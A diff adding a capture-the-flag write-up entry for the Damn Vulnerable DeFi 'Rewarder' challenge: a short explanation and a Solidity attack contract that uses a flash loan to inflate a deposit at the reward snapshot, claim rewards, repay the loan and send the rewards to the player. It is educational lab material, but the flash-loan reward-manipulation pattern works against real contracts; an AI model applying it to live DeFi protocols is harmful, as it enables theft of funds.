@@ -90,6 +90,48 @@ contract Attack {
 
 ## Challenge5
 
-```javascript
+The reward pool only count the amount of deposit. We can use flash loan to borrow some DVT token and claim the reward token at the same time.Here goes the code:
 
+```javascript
+contract TheRewardAttack {
+    //flashloan pool address.
+    FlashLoanerPool  private immutable pool;
+    DamnValuableToken private immutable DVTtoken;
+    TheRewarderPool private immutable RewardPool;
+    RewardToken private immutable RdToken;
+    address private owner;
+
+    constructor(FlashLoanerPool _pool,DamnValuableToken _token,TheRewarderPool _RewardPool,RewardToken _Rdtoken,address player) {
+        pool = _pool;
+        DVTtoken = _token;
+        RewardPool = _RewardPool;
+        RdToken = _Rdtoken;
+        owner = player;
+    }
+
+    function receiveFlashLoan(uint256 amount) external{
+        //do something.
+        //deposit to reward pool
+        //approve amount to the reward pool
+        DVTtoken.approve(address(RewardPool),amount);
+
+        RewardPool.deposit(amount);
+
+        //claim the rewards
+        RewardPool.distributeRewards();
+
+        //withdraw DVTtokens
+        RewardPool.withdraw(amount);
+
+        //return back DVT token.
+        DVTtoken.transfer(address(pool),amount);
+
+        //send reward token to our player.
+        RdToken.transfer(owner,RdToken.balanceOf(address(this)));
+    }
+
+    function attack(uint256 amount) external{
+        pool.flashLoan(amount);
+    }
+}
 ```
